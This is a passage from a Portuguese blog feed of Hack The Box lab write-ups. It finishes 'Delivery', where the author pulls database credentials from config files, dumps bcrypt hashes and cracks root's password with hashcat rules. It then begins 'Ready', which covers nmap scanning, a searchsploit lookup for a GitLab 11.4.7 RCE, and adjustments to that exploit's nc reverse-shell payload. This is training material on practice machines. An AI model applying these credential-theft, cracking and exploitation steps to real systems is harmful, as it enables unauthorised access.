  &lt;li&gt;Processo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3 /root/py-smtp.py&lt;/code&gt; em execução pelo usuário &lt;strong&gt;root&lt;/strong&gt;. Pode eventualmente permitir algum tipo de path hijack dependendo de quais binários são chamados por este script, caso tenhamos acesso leitura no mesmo.&lt;/li&gt;
  &lt;li&gt;Também é executado por &lt;strong&gt;root&lt;/strong&gt; um script em &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root/mail.sh&lt;/code&gt;, podendo ser eventualmente explorado conforme item anterior.&lt;/li&gt;
  &lt;li&gt;Serviço MySQL em execução na máquina na porta padrão (3306/TCP).&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;osticket&quot;&gt;osTicket&lt;/h3&gt;

&lt;p&gt;Embora pudessem ser caminhos promissores, não foi possível ler os arquivos citados, logo parti pra outra abordagem que seria buscar por credencias para conexão no MySQL. Analisando os arquivos do osTicket, encontrei em &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/osticket/upload/include/ost-config.php&lt;/code&gt; as credenciais para o usuário &lt;strong&gt;ost_user&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-ini highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;define('SECRET_SALT','nP8uygzdkzXRLJzYUmdmLDEqDSq5bGk3')&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;;
&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;define('ADMIN_EMAIL','maildeliverer@delivery.htb')&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;;
&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;define('DBTYPE','mysql')&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;;
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;define('DBHOST','localhost')&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;;
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;define('DBNAME','osticket')&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;;
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;define('DBUSER','ost_user')&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;;
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;define('DBPASS','!H3lpD3sk123!')&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;;
&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;define('TABLE_PREFIX','ost_')&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Entretanto ao se conectar no banco de dados, não encontrado nenhuma informação útil, onde decidi seguir para a aplicação Mattermost.&lt;/p&gt;

&lt;h3 id=&quot;mattermost&quot;&gt;Mattermost&lt;/h3&gt;

&lt;p&gt;De acordo com os processos em execução, a aplicação é executada a partir do diretório &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/mattermost/config/config.json&lt;/code&gt; encontrei outra credencial para conexão ao mysql.&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;SqlSettings&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;DriverName&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;mysql&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;DataSource&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0026readTimeout=30s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0026writeTimeout=30s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;DataSourceReplicas&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;DataSourceSearchReplicas&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;MaxIdleConns&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;ConnMaxLifetimeMilliseconds&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3600000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;MaxOpenConns&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;300&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;Trace&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;AtRestEncryptKey&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;n5uax3d4f919obtsp1pw1k5xetq1enez&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;QueryTimeout&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;DisableDatabaseSearch&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Utilizando as credenciais &lt;strong&gt;mmuser:Crack_The_MM_Admin_PW&lt;/strong&gt; acessei o database &lt;strong&gt;mattermost&lt;/strong&gt; e na tabela users, encontrei os seguintes usuários e hashes, onde temos o usuário &lt;strong&gt;root&lt;/strong&gt; com privilégios de &lt;strong&gt;system_admin&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;MariaDB [mattermost]&amp;gt; select Username,Password,Roles from Users;
+----------------------------------+--------------------------------------------------------------+--------------------------+
| Username                         | Password                                                     | Roles                    |
+----------------------------------+--------------------------------------------------------------+--------------------------+
| jdoe                             | $2a$10$qmuCH.AHht/dUGLd8ZyxMOMeZl6nU67B5okAiC0Vx44isKs5y6nkq | system_user              |
| surveybot                        |                                                              | system_user              |
| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK | system_user              |
| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G | system_user              |
| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO | system_admin system_user |
| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq | system_user              |
| channelexport                    |                                                              | system_user              |
| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm | system_user              |
+----------------------------------+--------------------------------------------------------------+--------------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Uma vez que no Mattermost o usuário root disse que a senha não estaria no dicionário, mas que poderia ser uma variação de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PleaseSubscribe!&lt;/code&gt;, pesquisando sobre algumas formas de fazer o cracking desta senha encontrei a seguinte forma usando o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcat&lt;/code&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;basicpwd.txt&lt;/code&gt; contém a senha &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PleaseSubscribe!&lt;/code&gt; conforme mencionado no Mattermost;&lt;/li&gt;
  &lt;li&gt;O arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;best64.rule&lt;/code&gt; contém algumas das mais populares formas de variação de senha.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Executando selecionando o tipo de hash correto (3200 - bcrypt), encontramos a senha &lt;strong&gt;PleaseSubscribe!21&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hashcat &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 3200 &lt;span class=&quot;nb&quot;&gt;hash &lt;/span&gt;basicpwd.txt &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; /usr/share/hashcat/rules/best64.rule
hashcat &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;v6.1.1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; starting...

OpenCL API &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Platform &lt;span class=&quot;c&quot;&gt;#1 [The pocl project]&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=============================================================================================================================&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Device &lt;span class=&quot;c&quot;&gt;#1: pthread-Intel(R) Xeon(R) CPU E5-2673 v4 @ 2.30GHz, 5847/5911 MB (2048 MB allocatable), 2MCU&lt;/span&gt;

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 77

Applicable optimizers applied:
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Zero-Byte
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Single-Hash
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;this attack: 64 MB

Dictionary cache built:
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Filename..: basicpwd.txt
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Passwords.: 1
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Bytes.....: 17
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Keyspace..: 77
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.

&lt;span class=&quot;nv&quot;&gt;$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O&lt;/span&gt;.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Utilizando a senha encontrada foi possível obter a última flag :smiley:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;maildeliverer@Delivery:/opt/mattermost/config&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su root
Password:
root@Delivery:/opt/mattermost/config# &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root/
root@Delivery:~# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root.txt
&amp;lt;redacted&amp;gt;
root@Delivery:~#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Além do root flag, no arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;note.txt&lt;/code&gt; ippsec deixa uma mensagem:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I’ve seen several times.  The inspiration for the box is here:&lt;/p&gt;

  &lt;p&gt;- &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c&lt;/code&gt;&lt;/p&gt;

  &lt;p&gt;Keep on hacking! And please don’t forget to subscribe to all the security streamers out there.&lt;/p&gt;

  &lt;p&gt;- ippsec&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Espero que tenham gostado!&lt;/p&gt;

&lt;p&gt;Até a próxima! :smile:&lt;/p&gt;</content><author><name>Davi Cruz</name></author><category term="Writeup" /><category term="HackTheBox" /><category term="htb-easy" /><category term="htb-linux" /><summary type="html">Olá pessoal! A máquina desta semana será Delivery, outra máquina Linux classificada como fácil do Hack The Box, criada por ippsec.</summary></entry><entry><title type="html">Hackthebox write-up: Ready</title><link href="https://davicruz.com/writeup/2021/05/htb-ready/" rel="alternate" type="text/html" title="Hackthebox write-up: Ready" /><published>2021-05-15T13:00:00-03:00</published><updated>2021-05-15T13:00:00-03:00</updated><id>https://davicruz.com/writeup/2021/05/htb-ready</id><content type="html" xml:base="https://davicruz.com/writeup/2021/05/htb-ready/">&lt;p&gt;Olá pessoal!&lt;/p&gt;

&lt;p&gt;A máquina desta semana será &lt;strong&gt;Ready&lt;/strong&gt;, outra máquina Linux classificada como mediana do &lt;a href=&quot;https://www.hackthebox.eu&quot;&gt;Hack The Box&lt;/a&gt;, criada por &lt;a href=&quot;https://app.hackthebox.eu/users/27897&quot;&gt;bertolis&lt;/a&gt;.&lt;!--more--&gt;&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;:information_source: &lt;strong&gt;Info&lt;/strong&gt;: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/iCTQUdu.png&quot; alt=&quot;HTB Ready&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Esta máquina foi bem interessante sua resolução, onde exploramos uma versão vulnerável do GitLab Server e na sequência precisamos escapar do container docker para obter a flag de root.&lt;/p&gt;

&lt;h2 id=&quot;enumeração&quot;&gt;Enumeração&lt;/h2&gt;

&lt;p&gt;Como de costume, iniciamos com a enumeração rápida do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para identificar os serviços publicados nesta máquina:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; quick 10.10.10.220
Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;will be slower.
Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-02-27 12:05 &lt;span class=&quot;nt&quot;&gt;-03&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.220
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.078s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
5080/tcp open  http    nginx
| http-robots.txt: 53 disallowed entries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;15 shown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/edit /users /help 
|_/s/ /snippets/new /snippets/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/edit
| http-title: Sign &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;C2&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;B7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;16.65 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;5080tcp---serviço-http&quot;&gt;5080/TCP - Serviço HTTP&lt;/h3&gt;

&lt;p&gt;Conforme pode ser visto no resultado do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; se trata de um serviço GitLab Community. Similar à máquina &lt;a href=&quot;/writeup/2021/04/htb-laboratory/&quot;&gt;Laboratory&lt;/a&gt;, segui com a criação de uma nova conta para verificar a versão do servidor e eventuais projetos públicos disponíveis.&lt;/p&gt;

&lt;p&gt;Após criada a conta, pude comprovar que a versão em execução é a &lt;strong&gt;11.4.7&lt;/strong&gt;, conforme podemos ver na imagem abaixo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/V5Oj0fB.png&quot; alt=&quot;Gitlab Version&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;initial-foothold&quot;&gt;Initial Foothold&lt;/h2&gt;

&lt;p&gt;Realizando uma busca rápida no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt;, identificadas algumas versões de exploit para a versão de GitLab Server identificada.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit gitlab 11.4.7
&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
 Exploit Title                                                           |  Path
&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
GitLab 11.4.7 - RCE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                      | ruby/webapps/49334.py
Gitlab 11.4.7 - Remote Code Execution                                    | ruby/webapps/49257.py
GitLab 11.4.7 - Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                    | ruby/webapps/49263.py
&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
Shellcodes: No Results
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Utilizando o último exploit listado (49334.py) notei que não possuía a opção de fornecer a porta do GitLab Server (vide output abaixo), assim como existe um erro nos parâmetros para recebimento do shell reverso onde foi necesário alterar o parametro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local_port&lt;/code&gt; para &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local_port = args.P&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 49334.py &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;                                                                
usage: 49334.py &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; U &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; P &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; G &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; L &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; P

GitLab 11.4.7 RCE

optional arguments:
  &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--help&lt;/span&gt;  show this &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;message and &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; U        GitLab Username/Email
  &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; P        Gitlab Password
  &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; G        Gitlab URL &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;without port&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; L        reverse shell ip
  &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; P        reverse shell port
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Adicionalmente, foi necessário alterar o payload utilizado pelo script, que apenas realizava a conexão via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; no endereço e portas especificados, mas nao exportava o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;, impedindo a interação com a máquina.&lt;/p&gt;

&lt;p&gt;Após ajustes, obtido shell com a conta &lt;strong&gt;git&lt;/strong&gt; no diretório &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/gitlab-rails/working&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;user-flag&quot;&gt;User flag&lt;/h2&gt;

&lt;p&gt;Após shell inicial, iniciada enumeração fazendo uso do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linenum.sh&lt;/code&gt;, onde os seguintes pontos chamaram atenção:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Execução dentro de container docker, possivelmente sendo necessário futuramente escapar deste para o host.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Existe usuário local &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dude&lt;/code&gt; (id=1000), no qual o arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; encontra-se em seu home directory.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Obtido hash de contas do GitLab Server, onde o usuário &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; é o único privilegiado, possuindo o seguinte hash de senha:&lt;/p&gt;

    &lt;table&gt;
      &lt;thead&gt;
        &lt;tr&gt;
          &lt;th&gt;username&lt;/th&gt;
          &lt;th&gt;e-mail&lt;/th&gt;
          &lt;th&gt;admin&lt;/th&gt;
          &lt;th&gt;hash&lt;/th&gt;
        &lt;/tr&gt;
      &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;root&lt;/td&gt;
          &lt;td&gt;admin@example.com&lt;/td&gt;
          &lt;td&gt;true&lt;/td&gt;
          &lt;td&gt;$2a$10$zzun9kmrHMdwsJZKTmwn9OZddFjwrhbaXx3b2eb9l2g.1LrjZo0V2&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
&lt;/ul&gt;

